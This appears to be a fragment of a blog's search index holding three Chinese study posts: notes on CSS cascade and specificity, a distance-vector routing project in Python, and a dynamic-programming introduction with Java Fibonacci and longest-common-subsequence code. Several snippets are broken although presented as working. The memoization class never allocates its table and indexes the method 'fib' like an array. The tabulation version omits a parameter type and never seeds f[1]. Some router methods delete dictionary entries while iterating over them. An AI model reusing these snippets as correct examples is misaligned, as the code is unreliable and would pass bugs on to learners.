        <category>CS70</category>
      </categories>
      <tags>
        <tag>math</tag>
      </tags>
  </entry>
  <entry>
    <title>css-in-depth-chapter-1</title>
    <url>/2019/01/16/css-in-depth-chapter-1/</url>
    <content><![CDATA[<h1 id="层叠，特殊性和继承"><a href="#层叠，特殊性和继承" class="headerlink" title="层叠，特殊性和继承"></a>层叠，特殊性和继承</h1><h2 id="层叠"><a href="#层叠" class="headerlink" title="层叠"></a>层叠</h2><p>在各样式声明冲突时，层叠性考虑这些去解析：</p>
<ul>
<li>样式表来源</li>
<li>选择器的特殊性</li>
<li>源顺序</li>
</ul>


<h3 id="样式表来源"><a href="#样式表来源" class="headerlink" title="样式表来源"></a>样式表来源</h3><h4 id="UA样式"><a href="#UA样式" class="headerlink" title="UA样式"></a>UA样式</h4><p>开发人员添加的样式表并不是唯一被浏览器应用的样式表，此外，用户代理(User Agent)也有自己的一套规则，它们和author styles一并用于样式渲染。有些浏览器还让用户自定义样式，暂不考虑。</p>
<p>UA的样式因浏览器不同而不同，但大体保持如下：h1到h6以及p具有上下外边距，列表（ol和ul）具有左内边距，上下外边距，而链接颜色和字体大小也被设定。列表的list-style-type设置为disc显示为无序列表的左侧圆点。</p>
<p>UA样式可被author style重写，因为后者优先级更高。如果在html中引入多个样式表，它们都具有author style的优先级别。</p>
<h4 id="important声明"><a href="#important声明" class="headerlink" title="important声明"></a>important声明</h4><p>声明的分号前加一个<code>!important</code>会以更高的优先级源来处理。所以author important&gt;author&gt;user agent。</p>
<p>每个元素的property都被独立处理，当在p标签上设置粗体时，并不会影响p标签的UA定义的上下外边距样式。</p>
<h3 id="特殊性"><a href="#特殊性" class="headerlink" title="特殊性"></a>特殊性</h3><p>如果矛盾声明无法通过源来解决，那么就需要考虑声明的特殊性。浏览器用两部分来评估特殊性，一方面是HTML应用的行内样式，一方面是用选择器应用的样式。</p>
<h4 id="行内样式"><a href="#行内样式" class="headerlink" title="行内样式"></a>行内样式</h4><p>行内样式直接应用到定位元素，因为他们不存在选择器一说。而应用的行内样式会覆盖style标签或者外部样式表定义的样式。</p>
<p>为了在外部样式表或者style标签中重写行内样式声明，可以添加<code>!important</code>声明使之成为具有更高优先级的源。如果行内样式添加了<code>!important</code>，那么它的声明永远不会被覆盖，最好在样式表中使用<code>!important</code>。</p>
<h4 id="选择器特殊性"><a href="#选择器特殊性" class="headerlink" title="选择器特殊性"></a>选择器特殊性</h4><p>简言之，选择器的特殊性这样理解：</p>
<ul>
<li>如果一个选择器有更多的ID选择器，则优先级更高</li>
<li>如果ID选择器相同，则具有更多的类选择器的优先级更高</li>
<li>如果类选择器也相同，则看元素选择器</li>
</ul>
<p>伪类选择器(:hover)和属性选择器([type=”input”])和类选择器特殊性等同，而通用选择器(*)和连接符(&gt; + ~)对特殊性没有影响。</p>
<p>如果有时候你写的规则无效，很有可能是别的具有更高特殊性的规则重写了它。许多程序员滥用id选择器却不知道id选择器具有更高的特殊性，使得后期重写其样式变得困难，因为你必须使用另一个id选择器。</p>
<h4 id="特殊性记法"><a href="#特殊性记法" class="headerlink" title="特殊性记法"></a>特殊性记法</h4><p>普遍的记录特殊性的方法就是用逗号分割的3个数字，依次代表id选择器，类选择器和元素选择器的数量。1，0，0的特殊性要高于0，10，1，因为id选择器具有更高优先级。</p>
<p>有时，人们也使用4个数字的记法，其中第一个数字代表行内样式，0代表没有行内样式，1代表有行内样式，存在行内样式时，无论后面数字是多少，都会解析为行内样式。</p>
<h4 id="特殊性注意事项"><a href="#特殊性注意事项" class="headerlink" title="特殊性注意事项"></a>特殊性注意事项</h4><p>尽可能降低使用的选择器的特殊性，便于后期维护。</p>
<h3 id="理解源顺序"><a href="#理解源顺序" class="headerlink" title="理解源顺序"></a>理解源顺序</h3><p>如果源和特殊性都相同，就要看源顺序，出现在同一样式表中靠后的规则被应用，出现在同一页面后引入的样式表样式被应用。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:link</span> &#123;</span><br><span class="line"><span class="attribute">color</span>: blue;</span><br><span class="line"><span class="attribute">text-decoration</span>: none;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:visited</span> &#123;</span><br><span class="line"><span class="attribute">color</span>: purple;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line"><span class="attribute">text-decoration</span>: underline;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:active</span> &#123;</span><br><span class="line"><span class="attribute">color</span>: red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同样的特殊性，定义在后面的样式被应用，当我们hover的时候，样式要覆盖掉link状态的样式和visited状态的样式，而active状态下要覆盖掉hover状态的样式。可通过LoVe/HAte来助记。</p>
<h4 id="层叠值（cascaded-value）"><a href="#层叠值（cascaded-value）" class="headerlink" title="层叠值（cascaded value）"></a>层叠值（cascaded value）</h4><p>浏览器遵循这三个步骤——源，特殊性，源顺序为页面每个元素的每个属性做解析，并最终得到一个层叠值做渲染。每个属性只可能有一个层叠值，如果一个属性从始至终没有被任何源指定，那么它没有层叠值。比如p元素可能没有内边距或者边框。</p>
<h3 id="两个经验法则"><a href="#两个经验法则" class="headerlink" title="两个经验法则"></a>两个经验法则</h3><ul>
<li>不要使用ID选择器</li>
<li>不要使用!important</li>
</ul>
<p>不过也有例外的情况，只是不要将它们作为赢得特异性战争的武器而已。</p>
<h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><p>如果属性没有层叠值，那么它可能会从祖先元素继承。如在body上定义font-family，那么所有的后代元素都会自动继承这个规则。</p>
<p>并非所有属性都会被继承，这些被继承的属性多是你期望要被继承的属性，一般和文字相关：color , font , font-family , font-size , font-weight , font-variant , font-style , line-height , letter-spacing , text-align , text-indent , text-transform , white-space , word-spacing等。</p>
<p>还有列表相关的list-style , list-style<br>-type , list-style-position , list-style-image等。表格边框属性border-collapse , border-spacing也被继承。</p>
<h2 id="特殊值"><a href="#特殊值" class="headerlink" title="特殊值"></a>特殊值</h2><p>有两个特殊值可被用于设置属性来修改你的层叠：<code>inherit</code>和<code>initial</code>。</p>
]]></content>
      <categories>
        <category>CSS In Depth</category>
      </categories>
  </entry>
  <entry>
    <title>distance-vector</title>
    <url>/2018/12/07/distance-vector/</url>
    <content><![CDATA[<h1 id="距离矢量算法"><a href="#距离矢量算法" class="headerlink" title="距离矢量算法"></a>距离矢量算法</h1><ul>
<li>迭代式：算法持续进行直至无信息需要在邻居间交换</li>
<li>分布式：每个节点收到邻居传送过来的路由信息，计算后再分发计算结果给邻居</li>
<li>异步：不需要所有的节点同时操作</li>
<li>自终止：算法不需要终止信号，知道什么时候应该终止</li>
</ul>
<a id="more"></a>

<h2 id="算法过程"><a href="#算法过程" class="headerlink" title="算法过程"></a>算法过程</h2><p>我们表示从a到b的代价为$c_ab$，然后通过相邻节点之间的路由信息交换，根据Bellman-Ford方程，我们有<br>$$d_xy=minv(c_xv+d_vy)$$<br>显而易见，对于与x相邻的任何节点v，若$d_vy$是v到y的最短代价，那么x到y的最短代价就是与x相邻的所有节点里面$c_xv+d_vy$最小的那个，这也是这个方程影射出的含义。</p>
<p>对于x节点来说，需要维护如下信息：</p>
<ul>
<li>x节点到每个相邻节点v的代价，记为$c_xv$</li>
<li>x节点自身的距离向量，可以是一个到图中所有节点的估计代价数组</li>
<li>x每个邻居节点v的距离向量。</li>
</ul>
<p>只要根据Bellman-Ford方程不断计算自身的距离向量，并将产生更新后的结果不断分发到相邻节点，经过若干次迭代之后，x到图中所有节点的估计代价就会收敛于实际的代价。</p>
<h2 id="算法伪代码"><a href="#算法伪代码" class="headerlink" title="算法伪代码"></a>算法伪代码</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Initialization:</span><br><span class="line">    for all destinations y in N:</span><br><span class="line">        D(x, y) &#x3D; c(x,y) if y is not a neighbor then c(x,y) &#x3D; ∞</span><br><span class="line">    for each neighbor w:</span><br><span class="line">        D(w, y) &#x3D; ? for all destinations y in N</span><br><span class="line">    for each neighbor w:</span><br><span class="line">        send distance vector D(x, y) &#x3D; [D(x, y) : y in N] to w</span><br><span class="line">loop:</span><br><span class="line">    wait (until I see a link cost change to some neighbor w or until I receive a distance vector from some neighbor w)</span><br><span class="line"></span><br><span class="line">    for each y in N:</span><br><span class="line">        D(x, y) &#x3D; minv(c(x, v) + D(v, y))</span><br><span class="line"></span><br><span class="line">    if D(x, y) changed for any destination y</span><br><span class="line">        send sitance vector D(x, y) &#x3D; [D(x, y) : y in N] to all neighbors</span><br><span class="line">forever</span><br></pre></td></tr></table></figure>

<h2 id="项目实现"><a href="#项目实现" class="headerlink" title="项目实现"></a>项目实现</h2><h3 id="计算转发表"><a href="#计算转发表" class="headerlink" title="计算转发表"></a>计算转发表</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_forwarding_table</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> port, peer_table <span class="keyword">in</span> self.peer_tables.items():</span><br><span class="line">        <span class="keyword">for</span> host, entry <span class="keyword">in</span> peer_table.items():</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> host <span class="keyword">in</span> self.forwarding_table:</span><br><span class="line">                self.forwarding_table[host] = ForwardingTableEntry(host, port, self.link_latency[port] + entry.latency)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> self.forwarding_table[host].latency &gt; self.link_latency[port] + entry.latency:</span><br><span class="line">                    self.forwarding_table[host] = ForwardingTableEntry(host, port, self.link_latency[port] + entry.latency)</span><br></pre></td></tr></table></figure>
<p>遍历所有相邻节点，如果某个终点主机不存在我们的转发表中，简单添加一个条目，否则，需要将旧的转发代价与新的转发代价作比较，如果新的小，就更新我们的转发表中的条目。</p>
<h3 id="转发数据包"><a href="#转发数据包" class="headerlink" title="转发数据包"></a>转发数据包</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle_data_packet</span><span class="params">(self, packet, in_port)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        Called when a data packet arrives at this router.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        You may want to forward the packet, drop the packet, etc. here.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        :param packet: the packet that arrived.</span></span><br><span class="line"><span class="string">        :param in_port: the port from which the packet arrived.</span></span><br><span class="line"><span class="string">        :return: nothing.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="comment"># <span class="doctag">TODO:</span> fill this in!</span></span><br><span class="line">        <span class="keyword">if</span> packet.dst <span class="keyword">in</span> self.forwarding_table <span class="keyword">and</span> self.forwarding_table[packet.dst].latency &lt; INFINITY <span class="keyword">and</span> self.forwarding_table[packet.dst].port != in_port:</span><br><span class="line">            self.send(packet, self.forwarding_table[packet.dst].port)</span><br></pre></td></tr></table></figure>
<p>首先需要确定packet的dst在我们的转发表中才有可能转发，然后转发表中到dst的latency不能大于INFINITY，而且转发表的出端口不能与入端口相同。只有同时满足这些条件，我们才调用send方法向合适的端口转发该包。</p>
<h3 id="通知路由（advertise-route）"><a href="#通知路由（advertise-route）" class="headerlink" title="通知路由（advertise route）"></a>通知路由（advertise route）</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle_link_up</span><span class="params">(self, port, latency)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        Called by the framework when a link attached to this router goes up.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        :param port: the port that the link is attached to.</span></span><br><span class="line"><span class="string">        :param latency: the link latency.</span></span><br><span class="line"><span class="string">        :returns: nothing.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        self.link_latency[port] = latency</span><br><span class="line">        self.peer_tables[port] = PeerTable()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># <span class="doctag">TODO:</span> fill in the rest!</span></span><br><span class="line">        <span class="keyword">for</span> host, entry <span class="keyword">in</span> self.forwarding_table.items():</span><br><span class="line">            packet = basics.RoutePacket(host, entry.latency)</span><br><span class="line">            self.send(packet, port)</span><br></pre></td></tr></table></figure>

<p>转发表中的每一个路由信息都发送给新加入的链路的另一端。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_routes</span><span class="params">(self, force=False)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        Send route advertisements for all routes in the forwarding table.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        :param force: if True, advertises ALL routes in the forwarding table;</span></span><br><span class="line"><span class="string">                      otherwise, advertises only those routes that have</span></span><br><span class="line"><span class="string">                      changed since the last advertisement.</span></span><br><span class="line"><span class="string">        :return: nothing.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="comment"># <span class="doctag">TODO:</span> fill this in!</span></span><br><span class="line">        <span class="keyword">if</span> force == <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">for</span> port <span class="keyword">in</span> self.peer_tables:</span><br><span class="line">                <span class="keyword">for</span> host, entry <span class="keyword">in</span> self.forwarding_table.items():</span><br><span class="line">                    <span class="keyword">if</span> entry.port != port:</span><br><span class="line">                        <span class="keyword">if</span> entry.latency &gt;= INFINITY:</span><br><span class="line">                            route_packet = basics.RoutePacket(host, INFINITY)</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            route_packet = basics.RoutePacket(host, entry.latency)</span><br><span class="line">                        self.send(route_packet, port)</span><br></pre></td></tr></table></figure>
<p>split horizon检测，如果一个转发表的entry的出端口刚好和要advertise的端口相同，我们就跳过这一个，因为这条路由信息来自该端口，就不要把这条信息回发给该端口。另外就是当转发的latency大于等于INFINITY时，我们发送的路由信息的latency要标记为INFINITY</p>
<h3 id="添加静态路由"><a href="#添加静态路由" class="headerlink" title="添加静态路由"></a>添加静态路由</h3><p>与路由器直接相连的主机，需要添加一条永不过期的静态路由。做法是通过更新路由器的peer_tables里面该端口的peer_table，添加一个entry，表明这个主机到自己本身的latency为0，并且过期时间为FOREVER，然后我们更新转发表，并在更新转发表之后将全部路由信息重新发送至各个相连端口（通过send_routes方法)。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_static_route</span><span class="params">(self, host, port)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        Adds a static route to a host directly connected to this router.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Called automatically by the framework whenever a host is connected</span></span><br><span class="line"><span class="string">        to this router.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        :param host: the host.</span></span><br><span class="line"><span class="string">        :param port: the port that the host is attached to.</span></span><br><span class="line"><span class="string">        :returns: nothing.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="comment"># `port` should have been added to `peer_tables` by `handle_link_up`</span></span><br><span class="line">        <span class="comment"># when the link came up.</span></span><br><span class="line">        <span class="keyword">assert</span> port <span class="keyword">in</span> self.peer_tables, <span class="string">"Link is not up?"</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># <span class="doctag">TODO:</span> fill this in!</span></span><br><span class="line">        self.peer_tables[port][host] = PeerTableEntry(host, <span class="number">0</span>, PeerTableEntry.FOREVER)</span><br><span class="line">        self.update_forwarding_table()</span><br><span class="line">        self.send_routes()</span><br></pre></td></tr></table></figure>
<h3 id="处理路由通知-handle-route-advertisement"><a href="#处理路由通知-handle-route-advertisement" class="headerlink" title="处理路由通知(handle route advertisement)"></a>处理路由通知(handle route advertisement)</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle_route_advertisement</span><span class="params">(self, dst, port, route_latency)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        Called when the router receives a route advertisement from a neighbor.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        :param dst: the destination of the advertised route.</span></span><br><span class="line"><span class="string">        :param port: the port that the advertisement came from.</span></span><br><span class="line"><span class="string">        :param route_latency: latency from the neighbor to the destination.</span></span><br><span class="line"><span class="string">        :return: nothing.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="comment"># <span class="doctag">TODO:</span> fill this in!</span></span><br><span class="line">        self.peer_tables[port][dst] = PeerTableEntry(dst, route_latency, api.current_time()+ROUTE_TTL)</span><br><span class="line">        self.update_forwarding_table()</span><br><span class="line">        self.send_routes()</span><br></pre></td></tr></table></figure>
<p>首先更新peer_tables里面的相关信息，然后因为peer_tables的改变，我们通过update_forwarding_table方法重新计算转发表，并分发新的路由信息给各个端口。</p>
<h3 id="移除路由"><a href="#移除路由" class="headerlink" title="移除路由"></a>移除路由</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle_link_down</span><span class="params">(self, port)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        Called by the framework when a link attached to this router does down.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        :param port: the port number used by the link.</span></span><br><span class="line"><span class="string">        :returns: nothing.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="comment"># <span class="doctag">TODO:</span> fill this in!</span></span><br><span class="line">        <span class="keyword">for</span> host, entry <span class="keyword">in</span> self.forwarding_table.items():</span><br><span class="line">            <span class="keyword">if</span> entry.port == port:</span><br><span class="line">                <span class="keyword">del</span> self.forwarding_table[host]</span><br><span class="line">        <span class="keyword">del</span> self.peer_tables[port]</span><br><span class="line">        <span class="keyword">del</span> self.link_latency[port]</span><br><span class="line">        self.update_forwarding_table()</span><br><span class="line">        self.send_routes()</span><br></pre></td></tr></table></figure>
<p>当与路由器连接的某段链路被移除后，首先要移除转发表中所有从该端口转发的条目；然后要移除peer_tables从该端口获取的路由信息，链路延迟也要删除这个端口的条目，由于改变了peer_tables，所以我们重新计算转发表并将改变后的路由信息分发给各个端口。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">expire_routes</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        Clears out expired routes from peer tables; updates forwarding table</span></span><br><span class="line"><span class="string">        accordingly.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="comment"># <span class="doctag">TODO:</span> fill this in!</span></span><br><span class="line">        <span class="keyword">for</span> port, table <span class="keyword">in</span> self.peer_tables.items():</span><br><span class="line">            <span class="keyword">for</span> dst, entry <span class="keyword">in</span> table.items():</span><br><span class="line">                <span class="keyword">if</span> api.current_time() &gt; entry.expire_time:</span><br><span class="line">                    table.pop(dst)</span><br><span class="line">        self.update_forwarding_table()</span><br></pre></td></tr></table></figure>
<p>对于当前时间已经大于过期时间，就删除相应条目，处理完peer_tables过后，要对转发表重新计算。</p>
]]></content>
      <categories>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>路由算法</tag>
      </tags>
  </entry>
  <entry>
    <title>dynamic-programming</title>
    <url>/2018/12/21/dynamic-programming/</url>
    <content><![CDATA[<h1 id="动态规划算法"><a href="#动态规划算法" class="headerlink" title="动态规划算法"></a>动态规划算法</h1><p>动态规划算法是一种算法设计范式，将含有重复子问题的复杂问题，存储子问题的计算结果以避免重复计算。问题有如下两种特征可采用动态规划算法设计：</p>
<ul>
<li>重叠的子问题</li>
<li>最优子结构</li>
</ul>
<a id="more"></a>

<h2 id="重叠子问题"><a href="#重叠子问题" class="headerlink" title="重叠子问题"></a>重叠子问题</h2><p>像分治算法一样，动态规划算法也是组合子问题的解来解决一个大问题。动态规划主要用于子问题的解不断重复的需要的情况下，然后将子问题的解存到一个表里面，而不需要重复计算。如果一个问题不包含很多重复子问题，那么DP算法不太合适，如二分查找。但是递归的计算斐波那契数列就包含很多的重复子问题。如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">fib</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(n &lt;= <span class="number">1</span>) <span class="keyword">return</span> n;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> fib(n - <span class="number">1</span>) + fib(n - <span class="number">2</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>执行fib5的递归树：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">                          fib(5)</span><br><span class="line">                     &#x2F;             \</span><br><span class="line">               fib(4)                fib(3)</span><br><span class="line">             &#x2F;      \                &#x2F;     \</span><br><span class="line">         fib(3)      fib(2)         fib(2)    fib(1)</span><br><span class="line">        &#x2F;     \        &#x2F;    \       &#x2F;    \</span><br><span class="line">  fib(2)   fib(1)  fib(1) fib(0) fib(1) fib(0)</span><br><span class="line">  &#x2F;    \</span><br><span class="line">fib(1) fib(0)</span><br></pre></td></tr></table></figure>

<p>可以看到fib3被调用了两次，如果我们将fib3的结果存储起来，便不用重复计算了。有两种存储值的策略，以便这些值可被重复利用：</p>
<ul>
<li>Memoization（自顶向下）</li>
<li>Tabulation（自底向上）</li>
</ul>
<h3 id="Memoization"><a href="#Memoization" class="headerlink" title="Memoization"></a>Memoization</h3><p>这种策略在递归实现的程序上做了一点小小的修改。只是在计算solution之前查找lookup table。我们初始化一个lookup表，并将其全部置为NIL，当我们需要某个问题的解时，首先查找lookup表，若不存在我们再计算，然后将相应的结果存储到lookup表中，如果存在，不再继续计算，直接返回即可。如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Fibonacci</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> n;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> NIL = -<span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span>[] lookup;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Fibonacci</span><span class="params">(<span class="keyword">int</span> N)</span> </span>&#123;</span><br><span class="line">        n = N; </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">            lookup[i] = NIL;</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">fib</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(lookup[n] == -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(n &lt;= <span class="number">1</span>) <span class="keyword">return</span> n;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                lookup[n] = fib[n - <span class="number">1</span>] + fib[n - <span class="number">2</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> lookup[n];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Fibonacci f = <span class="keyword">new</span> Fibonacci(<span class="number">40</span>);</span><br><span class="line">        System.out.println(f.fib(<span class="number">40</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Tabulation"><a href="#Tabulation" class="headerlink" title="Tabulation"></a>Tabulation</h3><p>制表法采用自底向上的策略，首先计算fib(0),fib(1)，然后是fib(2),fib(3)等等。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Fibonacci</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">fib</span><span class="params">(n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] f = <span class="keyword">new</span> <span class="keyword">int</span>[n + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            f[i] = f[i - <span class="number">1</span>] + f[i - <span class="number">2</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> f[n];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(Fibonacci.fib(<span class="number">40</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Tabulation和Memoization的区别在于memoization是按需计算，而tabulation是计算出表中每一个entry。</p>
<h2 id="最优子结构"><a href="#最优子结构" class="headerlink" title="最优子结构"></a>最优子结构</h2><p>一个问题具有最优子结构特性，当其最优解可以由子问题的最优解获得。</p>
<p>举个例子来说，最短路径问题有如下最优子结构特性：假设x是u到v最短路径上的一个结点。那么u到v的最短路径必定是u到x的最短路径组合x到v的最短路径。最短路径算法如Floyd-warshall和Bellman-ford算法都是动态规划的体现。但是最长简单路径（无环）没有最优子结构特性。</p>
<h2 id="例程"><a href="#例程" class="headerlink" title="例程"></a>例程</h2><h3 id="最长递增子序列"><a href="#最长递增子序列" class="headerlink" title="最长递增子序列"></a>最长递增子序列</h3><p>相关题目：leetcode300</p>
<h3 id="最长公共子序列-LCS"><a href="#最长公共子序列-LCS" class="headerlink" title="最长公共子序列(LCS)"></a>最长公共子序列(LCS)</h3><p>给定两个字符串序列，找到它们最长的公共子序列，序列可以不连续。</p>
<p>具有最优子结构特性和重叠子问题，采用DP思想。可以自顶向下进行递归也可以自底向上迭代构建。</p>
<h4 id="自顶向下"><a href="#自顶向下" class="headerlink" title="自顶向下"></a>自顶向下</h4><p>我们维护一个二维数组，索引是两个字符数组中对应的不同长度序列，比如：<code>String s1 = &quot;GTAB&quot;; String s2 = &quot;GTAYB&quot;;</code>我们要解决的问题是找到<code>dp[4][5]</code>的值，为了求<code>dp[4][5]</code>，我们要将大问题分解为若干子问题。如果我们要处理的序列末尾字符是相同的，那么我们可以成功将问题规模减小，两个数组都可以减去最后一个共有元素，而如果我们要处理的序列末尾字符是不同的，依然可以将问题规模减小，我们所需要做的是，左边数组减1的规模和右边数组不变的情况下，以及左边数组规模不变右边数组规模减1这两种情况下的最大值。如果成功在某一步计算出结果，我们将结果存储到数组中，以实现记忆化。如代码所示</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LongestCommonSubsequence</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">LengthOfLCS</span><span class="params">(<span class="keyword">char</span>[] X, <span class="keyword">char</span>[] Y, <span class="keyword">int</span> m, <span class="keyword">int</span> n, <span class="keyword">int</span>[][] seen)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(m == <span class="number">0</span> || n == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(seen[m][n] != <span class="number">0</span>) <span class="keyword">return</span> seen[m][n];</span><br><span class="line">        <span class="keyword">if</span>(X[m - <span class="number">1</span>] == Y[n - <span class="number">1</span>])</span><br><span class="line">            seen[m][n] = LengthOfLCS(X, Y, m - <span class="number">1</span>, n - <span class="number">1</span>, seen) + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> seen[m][n] = Math.max(LengthOfLCS(X, Y, m - <span class="number">1</span>, n, seen), LengthOfLCS(X, Y, m, n - <span class="number">1</span>, seen));</span><br><span class="line">        <span class="keyword">return</span> seen[m][n];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String s1 = <span class="string">"GTAB"</span>;</span><br><span class="line">        String s2 = <span class="string">"GTAYB"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">char</span>[] X=s1.toCharArray();</span><br><span class="line">        <span class="keyword">char</span>[] Y=s2.toCharArray();</span><br><span class="line">        <span class="keyword">int</span> m = X.length;</span><br><span class="line">        <span class="keyword">int</span> n = Y.length;</span><br><span class="line">        <span class="keyword">int</span>[][] seen = <span class="keyword">new</span> <span class="keyword">int</span>[m + <span class="number">1</span>][n + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"Length of LCS is"</span> + <span class="string">" "</span> +</span><br><span class="line">                LengthOfLCS( X, Y, m, n, seen ) );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

